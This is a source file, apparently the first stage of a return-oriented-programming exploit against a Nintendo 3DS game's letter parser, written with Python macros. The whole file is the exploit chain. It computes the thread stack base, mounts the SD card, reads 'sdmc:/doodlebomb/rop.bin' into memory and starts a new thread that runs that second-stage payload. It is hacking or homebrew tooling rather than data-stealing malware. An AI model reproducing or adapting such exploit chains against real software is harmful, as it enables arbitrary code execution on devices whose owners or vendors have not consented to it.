from constants import *
include("macros.py")
###THIS ROP IS THREAD BASE STACK ADDRESS AGNOSTIC
###THUS IT CAN RUN WHENEVER THE ROP IS LAUNCHED, WHATEVER THE THREAD BASE STACK ADDRSS IS

set_mem_offset(STAGE0_OFFSET)
VALID_ADDRESS = HEAP_STAHED_DEST # we need a valid address to store result of createThread (unused)
                                 # this location is used for jumping to stage0, it is unused after stage0 is reached
STACK_BASE = HEAP_STAHED_DEST - 0x4 # we need a safe location to store the stack base address

BYTES_READ_OFF = 0x20
CONTEXT_OFFSET = 0x0 # the lowest offset of the current thread stack, definitely only zeros

begin_area(PARSE_LETTER_STACK_RETURN_OFFSET-4-STAGE0_OFFSET)

mov_r11_to_r0() # get an address that depends on the stack base address, so we can compute the current thread stack base address
add_r0(0x100000000 - R11_THREAD_BASE_ADDRESS_OFFSET) # sub 0xa08 to get the current thread base stack address
store_r0(STACK_BASE) # store the current stack base address to a safe location

#STORE EXIT_THREAD to STAGE1_DEST before trying to read the stage1 file
store(SVC_EXIT_THREAD, STAGE1_DEST) # store exitthread where stage1 should be copied,
                                    # then if the file can't be read, the thread dedicated to stage1 is closed
                                    # if the file is read, then exit_thread is overwritten, stage1 is executed

# MOUNT_SDMC
make_ptr_to_r0(STACK_BASE, sdmc_string) # load the smdc_string ptr to r0 according to its offset and the stack base address
add_word(FS_MOUNTSDMC + 0x4)
garbage(3)

# TRY_OPEN_FILE
make_ptr_to_r0(STACK_BASE, file_path) # load the file_path ptr to r0
mov_r0_to_r1() # move the file_path ptr to r1
make_ptr_to_r0(STACK_BASE, CONTEXT_OFFSET) # load the file context ptr to r0
pop(r2=FSFILE_READ) # openflags
add_word(FS_TRYOPENFILE + 0x4)
garbage(5)

# TRY_GET_SIZE
make_ptr_to_r0(STACK_BASE, file_size) # load file_size ptr to r0
mov_r0_to_r1() # move it to r1
make_ptr_to_r0(STACK_BASE, CONTEXT_OFFSET) # load the file context ptr to r0
add_word(FS_TRYGETSIZE + 0x4)
garbage(2)

# TRY_READ_FILE
load_r0_thread_base(STACK_BASE, CONTEXT_OFFSET) # dereference the value stored at the file context ptr to r0
mov_r0_to_r1() # move the file_ptr to r1

make_ptr_to_r0(STACK_BASE, BYTES_READ_OFF) # load the bytes_read ptr to r0
pop(r2=0, r3=0) # offsetl, offseth
add_word(FS_TRYREADFILE + 0x4)
garbage(6)
add_word(POP_R4R5R6PC)
add_word(STAGE1_DEST) # rop stage1 destination
put_label("file_size")
add_word(0xDEADC0DE) # here is stored the size of the file, u64
add_word(0xDEADC0DE)

SET_LR(NOP)
make_ptr_to_r0(STACK_BASE, CONTEXT_OFFSET) # load the file context ptr to r0
add_word(FS_CLOSEFILE + 0x4)

# Create new thread for stage1, since we can't really find a good stack address to store stage1
# (there're all really close to the end of the memregion)
SET_LR(POP_R4R5PC) # skip the two args after create_thread
pop(r0=VALID_ADDRESS, r3=STAGE1_DEST) # r0=valid address to store unused value
                                      # r3=thread stack pointer
                                      # r1=thread entrypoint, no need to set r1 here since SET_LR already does that
add_word(SVC_CREATE_THREAD)
add_word(0x31) # thread priority
add_word(0xFFFFFFFE) # -2 => execute thread on the default CPU


# we can't store the strings at the end of the rop because of the parse function
# args that are stored there, we keep them intact so the function return false
# if the stage1 file hasn't been read and the game just displays a message
# saying the letter is corrupted
add_word(ADD_SPSP_30_POP_R4PC) # just skip the string
put_label("file_path")
add_utf16("sdmc:/doodlebomb/rop.bin")
add_word(0x0) # r4 null terminator

add_word(POP_R4R5PC) # just skip the string
put_label("sdmc_string")
add_ascii("sdmc:\0\0\0")

end_area()
put_label("end")
